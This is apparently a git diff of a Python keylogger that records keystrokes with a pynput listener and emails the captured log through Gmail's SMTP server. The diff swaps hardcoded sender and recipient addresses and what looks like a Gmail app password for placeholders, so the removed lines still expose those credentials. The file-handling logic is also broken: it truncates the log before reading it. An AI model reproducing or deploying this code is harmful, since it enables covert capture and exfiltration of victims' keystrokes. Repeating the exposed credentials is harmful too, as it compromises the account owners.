@@ -32,10 +32,10 @@ with Listener(on_press=pressed,on_release=released) as l: #Taking pressed and re
 #Sending mails
 mail=smtplib.SMTP("smtp.gmail.com",587) #Initilizing an Object for "SMTP mail" wiht the "port 587"
 mail.starttls() #Starting the "TLS" service for secure login
-mail.login("phoenixguy307@gmail.com","asqvvwhfkowalaex") #Logging in with the mail an password
+mail.login("Sender_Email","Password") #Logging in with the mail an password
 file_obj=open("Logs.txt","w+") #Fuction to open the "Logs.txt" with "Write +" mode i.e "Truncate" which is used for removing the existing text from the files and the writing a new set of keys.
 message=file_obj.read() #Fuction to "read the text" present in the file
 file_obj.write('') #Function to "writing the new set of keys" captured by the program
 file_obj.close() #Function to closing the file after editing and reading it
-mail.sendmail("phoenixguy307@gmail.com","nikitsingh2001@gmail.com",message) #Fuction to send the mail with the arguments presents "From whome" , "To whome" ,"the message"
+mail.sendmail("Sender_Email","Receiver_Email",message) #Fuction to send the mail with the arguments presents "From whome" , "To whome" ,"the message"
 mail.quit() #Function to "closing the mail server"
